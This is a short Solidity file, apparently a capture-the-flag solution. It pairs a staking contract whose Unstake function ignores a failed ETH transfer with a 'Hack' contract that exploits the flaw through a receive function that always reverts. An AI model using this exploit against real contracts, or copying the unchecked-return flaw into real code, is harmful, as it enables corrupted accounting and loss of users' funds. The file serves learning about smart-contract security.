// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    Stake stake;

    constructor(Stake _stake) {
        stake = _stake;
    }

    function sendToStake() public payable  {
        stake.StakeETH{value: msg.value}();
    }

    function pwnUnstake(uint amount) public {
        stake.Unstake(amount);
    }

    receive() external payable {
        // test
        require(false, "gotem");
    }
}

contract Stake {

    uint256 public totalStaked;
    mapping(address => uint256) public UserStake;
    mapping(address => bool) public Stakers;
    address public WETH;

    constructor(address _weth) payable{
        totalStaked += msg.value;
        WETH = _weth;
    }

    function StakeETH() public payable {
        require(msg.value > 0.001 ether, "Don't be cheap");
        totalStaked += msg.value;
        UserStake[msg.sender] += msg.value;
        Stakers[msg.sender] = true;
    }

    function Unstake(uint256 amount) public returns (bool){
        require(UserStake[msg.sender] >= amount,"Don't be greedy");
        UserStake[msg.sender] -= amount;
        totalStaked -= amount;
        (bool success, ) = payable(msg.sender).call{value : amount}("");
        return success;
    }
}